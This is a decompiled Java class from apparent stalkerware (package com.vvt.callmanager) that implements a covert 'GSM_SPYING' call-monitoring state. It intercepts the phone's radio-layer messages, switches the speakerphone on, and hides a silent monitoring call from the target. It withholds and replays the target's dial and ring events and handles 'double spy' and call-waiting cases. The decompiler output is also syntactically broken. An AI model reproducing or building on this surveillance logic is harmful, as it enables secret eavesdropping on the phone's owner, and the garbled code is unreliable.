package com.vvt.callmanager.filter;

import android.media.AudioManager;
import android.os.Parcel;
import android.os.SystemClock;
import com.vvt.callmanager.a.d;
import com.vvt.callmanager.a.j;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.mitm.a;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.MonitorDisconnectData.Reason;
import com.vvt.callmanager.ref.f;
import java.util.ArrayList;

 enum FilterGsmCall$CallState$4
{
  private byte[] cacheRequestDial;
  private byte[] cacheRequestMute;
  private byte[] cacheUnsolCallRing;
  private FilterGsmCall.CallState exitState;
  private boolean isWaitingForHangupResponse;
  private d monitorCallInfo;
  private int monitorIndex;
  private com.vvt.callmanager.a.h musicMonitoring;
  private j musicPlayListener;
  
  FilterGsmCall$CallState$4()
  {
    super(paramString, paramInt, null);
  }
  
  private void a()
  {
    int i = this.monitorIndex;
    FilterGsmCall localFilterGsmCall = this.mFilterCall;
    m localm = FilterGsmCall.c(this.mFilterCall);
    i.a(i, localFilterGsmCall, localm);
    this.isWaitingForHangupResponse = true;
  }
  
  private void b()
  {
    Object localObject = new com/vvt/callmanager/filter/h;
    ((h)localObject).<init>(this);
    this.musicPlayListener = ((j)localObject);
    localObject = new com/vvt/callmanager/a/h;
    AudioManager localAudioManager = FilterGsmCall.e(this.mFilterCall);
    j localj = this.musicPlayListener;
    ((com.vvt.callmanager.a.h)localObject).<init>(localAudioManager, localj);
    this.musicMonitoring = ((com.vvt.callmanager.a.h)localObject);
    this.musicMonitoring.start();
  }
  
  private void c()
  {
    Object localObject = this.musicPlayListener;
    if (localObject != null) {
      this.musicPlayListener = null;
    }
    localObject = this.musicMonitoring;
    if (localObject != null)
    {
      localObject = this.musicMonitoring;
      ((com.vvt.callmanager.a.h)localObject).a();
      this.musicMonitoring = null;
    }
  }
  
  public void onEnter(Object paramObject)
  {
    int i = 1;
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall localFilterGsmCall = this.mFilterCall;
    FilterGsmCall.a(localFilterGsmCall);
    if (paramObject != null)
    {
      bool = paramObject instanceof d;
      if (bool)
      {
        paramObject = (d)paramObject;
        this.monitorCallInfo = ((d)paramObject);
        j = this.monitorCallInfo.a();
        this.monitorIndex = j;
        localFilterGsmCall = this.mFilterCall;
        Object[] arrayOfObject = new Object[i];
        int k = this.monitorIndex;
        Integer localInteger = Integer.valueOf(k);
        arrayOfObject[0] = localInteger;
        String str = String.format("Monitor Index: %d", arrayOfObject);
        FilterGsmCall.a(localFilterGsmCall, str);
      }
    }
    this.cacheRequestMute = null;
    this.cacheRequestDial = null;
    this.cacheUnsolCallRing = null;
    this.isWaitingForHangupResponse = false;
    this.exitState = null;
    int j = this.monitorIndex;
    if (j > 0) {}
    for (j = this.monitorIndex;; j = i)
    {
      this.monitorIndex = j;
      b();
      FilterGsmCall.a(this.mFilterCall, "Music play listener is registered");
      FilterGsmCall.e(this.mFilterCall).setSpeakerphoneOn(i);
      FilterGsmCall.a(this.mFilterCall, "Speaker is ON");
      FilterGsmCall.e(this.mFilterCall).setParameters("realcall=on");
      localFilterGsmCall = this.mFilterCall;
      BugEngineCallState localBugEngineCallState = BugEngineCallState.GSM_SPYING;
      FilterGsmCall.a(localFilterGsmCall, localBugEngineCallState);
      return;
    }
  }
  
  public Object onExit()
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    c();
    FilterGsmCall.a(this.mFilterCall, "Music play listener is unregistered");
    FilterGsmCall.e(this.mFilterCall).setSpeakerphoneOn(false);
    FilterGsmCall.a(this.mFilterCall, "Speaker is OFF");
    FilterGsmCall.b(this.mFilterCall);
    return SPYING;
  }
  
  public FilterGsmCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 1;
    Object localObject1 = null;
    Object localObject2 = FilterGsmCall.c(this.mFilterCall);
    int j = ((m)localObject2).c(paramParcel);
    int m = 1001;
    Object localObject3;
    if (j == m)
    {
      FilterGsmCall.a(this.mFilterCall, "Call state changed -> Get current calls");
      localObject3 = FilterGsmCall.c(this.mFilterCall);
      localObject2 = this.mFilterCall;
      i.a((m)localObject3, (n)localObject2);
      i = 0;
      localObject3 = null;
      localObject1 = this;
    }
    Object localObject4;
    for (;;)
    {
      if (i != 0)
      {
        localObject3 = this.mFilterCall;
        ((FilterGsmCall)localObject3).c(paramParcel);
      }
      this.exitState = ((FilterGsmCall.CallState)localObject1);
      return (FilterGsmCall.CallState)localObject1;
      localObject4 = this.mFilterCall;
      boolean bool2 = FilterGsmCall.a((FilterGsmCall)localObject4, paramParcel, j);
      if (bool2)
      {
        localObject3 = this.mFilterCall;
        localObject2 = "Found incoming call -> Wait for the list";
        FilterGsmCall.a((FilterGsmCall)localObject3, (String)localObject2);
        localObject3 = paramParcel.marshall();
        this.cacheUnsolCallRing = ((byte[])localObject3);
        i = 0;
        localObject3 = null;
        localObject1 = this;
      }
      else
      {
        n = 1049;
        if (j == n)
        {
          i = 0;
          localObject3 = null;
          localObject1 = this;
        }
        else
        {
          n = 11010;
          if (j != n) {
            break;
          }
          FilterGsmCall.a(this.mFilterCall, "Blocking Samsung magic request ..");
          localObject3 = FilterGsmCall.c(this.mFilterCall);
          localObject2 = this.mFilterCall;
          i.a((m)localObject3, (n)localObject2);
          i = 0;
          localObject3 = null;
          localObject1 = this;
        }
      }
    }
    int n = 9;
    Object localObject5;
    if (j == n)
    {
      FilterGsmCall.a(this.mFilterCall, "Got current calls response");
      localObject2 = d.a(paramParcel);
      localObject5 = FilterGsmCall.c(this.mFilterCall).a();
      i.a("FilterCall", (ArrayList)localObject2, (a)localObject5);
      localObject4 = FilterGsmCall.a(this.mFilterCall, (ArrayList)localObject2);
      boolean bool4 = this.isWaitingForHangupResponse;
      if (bool4) {
        if (localObject2 != null)
        {
          i = ((ArrayList)localObject2).size();
          if (i != 0) {}
        }
        else
        {
          localObject3 = this.cacheRequestDial;
          if (localObject3 != null)
          {
            localObject3 = this.mFilterCall;
            localObject2 = "Monitor is released -> Forward dialing message";
            FilterGsmCall.a((FilterGsmCall)localObject3, (String)localObject2);
            localObject3 = this.cacheRequestMute;
            if (localObject3 != null)
            {
              localObject3 = this.mFilterCall;
              localObject2 = i.a(this.cacheRequestMute);
              ((FilterGsmCall)localObject3).d((Parcel)localObject2);
            }
            localObject3 = this.mFilterCall;
            localObject2 = i.a(this.cacheRequestDial);
            ((FilterGsmCall)localObject3).d((Parcel)localObject2);
            localObject3 = DIALING;
          }
        }
      }
    }
    for (;;)
    {
      localObject1 = localObject3;
      i = 0;
      localObject3 = null;
      break;
      localObject3 = IDLE;
      continue;
      if (localObject4 != null)
      {
        FilterGsmCall.a(this.mFilterCall, "Monitor is released -> Forward ringing messages");
        localObject3 = this.mFilterCall;
        localObject2 = this.cacheUnsolCallRing;
        i.a((n)localObject3, (byte[])localObject2);
        localObject3 = RINGING;
      }
      else
      {
        this.isWaitingForHangupResponse = false;
        localObject3 = this;
        continue;
        int k;
        if (localObject4 != null)
        {
          int i1 = ((ArrayList)localObject2).size();
          if (i1 > i)
          {
            localObject2 = this.mFilterCall;
            Object[] arrayOfObject = new Object[i];
            arrayOfObject[0] = localObject4;
            localObject5 = String.format("Waiting call: %s", arrayOfObject);
            FilterGsmCall.a((FilterGsmCall)localObject2, (String)localObject5);
            localObject2 = FilterGsmCall.d(this.mFilterCall);
            localObject4 = ((d)localObject4).d();
            k = ((f)localObject2).a((String)localObject4);
            if (k != 0)
            {
              FilterGsmCall.a(this.mFilterCall, "Waiting call is getInstance monitor -> Reject the latter one");
              localObject2 = this.mFilterCall;
              localObject4 = FilterGsmCall.c(this.mFilterCall);
              i.d((n)localObject2, (m)localObject4);
              this.isWaitingForHangupResponse = i;
              localObject3 = this.mFilterCall;
              localObject2 = new com/vvt/callmanager/ref/MonitorDisconnectData;
              localObject4 = this.monitorCallInfo.d();
              localObject5 = MonitorDisconnectData.Reason.DOUBLE_SPY;
              ((MonitorDisconnectData)localObject2).<init>((String)localObject4, (MonitorDisconnectData.Reason)localObject5);
              FilterGsmCall.a((FilterGsmCall)localObject3, (MonitorDisconnectData)localObject2);
              localObject3 = this;
              continue;
            }
            FilterGsmCall.a(this.mFilterCall, "Waiting call is getInstance normal -> Release the monitor");
            a();
            FilterGsmCall.a(this.mFilterCall, "Waiting call is getInstance normal -> Delay 1 second");
            long l = 500L;
            SystemClock.sleep(l);
            localObject3 = this.mFilterCall;
            localObject2 = new com/vvt/callmanager/ref/MonitorDisconnectData;
            localObject4 = this.monitorCallInfo.d();
            localObject5 = MonitorDisconnectData.Reason.CALL_WAITING;
            ((MonitorDisconnectData)localObject2).<init>((String)localObject4, (MonitorDisconnectData.Reason)localObject5);
            FilterGsmCall.a((FilterGsmCall)localObject3, (MonitorDisconnectData)localObject2);
            localObject3 = this;
            continue;
          }
        }
        i = ((ArrayList)localObject2).size();
        if (i == 0)
        {
          localObject3 = this.mFilterCall;
          localObject2 = "Monitor is gone";
          FilterGsmCall.a((FilterGsmCall)localObject3, (String)localObject2);
          localObject3 = IDLE;
          continue;
          boolean bool3 = this.isWaitingForHangupResponse;
          if (bool3)
          {
            boolean bool1 = i.a(k);
            if (bool1)
            {
              FilterGsmCall.a(this.mFilterCall, "Got hangup response");
              localObject3 = FilterGsmCall.c(this.mFilterCall);
              localObject2 = this.mFilterCall;
              i.a((m)localObject3, (n)localObject2);
              i = 0;
              localObject3 = null;
              localObject1 = this;
              break;
            }
          }
          localObject1 = this;
          break;
        }
        localObject3 = this;
      }
    }
  }
  
  public FilterGsmCall.CallState processRilRequest(Parcel paramParcel)
  {
    int i = 1;
    float f = Float.MIN_VALUE;
    int j = 0;
    FilterGsmCall localFilterGsmCall = null;
    Object localObject = FilterGsmCall.c(this.mFilterCall);
    int k = ((m)localObject).b(paramParcel);
    int m = 53;
    if (k == m)
    {
      localObject = this.cacheRequestMute;
      if (localObject == null)
      {
        localObject = paramParcel.marshall();
        this.cacheRequestMute = ((byte[])localObject);
      }
      m = 0;
      localObject = null;
    }
    for (;;)
    {
      int n = 10;
      if (k == n)
      {
        FilterGsmCall.a(this.mFilterCall, "Target is making call -> Release monitor");
        localObject = paramParcel.marshall();
        this.cacheRequestDial = ((byte[])localObject);
        localObject = i.a(i.e);
        FilterGsmCall.c(this.mFilterCall).a((Parcel)localObject);
        this.mFilterCall.d((Parcel)localObject);
        this.isWaitingForHangupResponse = i;
        localObject = this.mFilterCall;
        MonitorDisconnectData localMonitorDisconnectData = new com/vvt/callmanager/ref/MonitorDisconnectData;
        String str = this.monitorCallInfo.d();
        MonitorDisconnectData.Reason localReason = MonitorDisconnectData.Reason.DIALING;
        localMonitorDisconnectData.<init>(str, localReason);
        FilterGsmCall.a((FilterGsmCall)localObject, localMonitorDisconnectData);
      }
      for (;;)
      {
        if (j != 0)
        {
          localFilterGsmCall = this.mFilterCall;
          localFilterGsmCall.d(paramParcel);
        }
        this.exitState = this;
        return this;
        j = m;
      }
      m = i;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterGsmCall$CallState$4.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */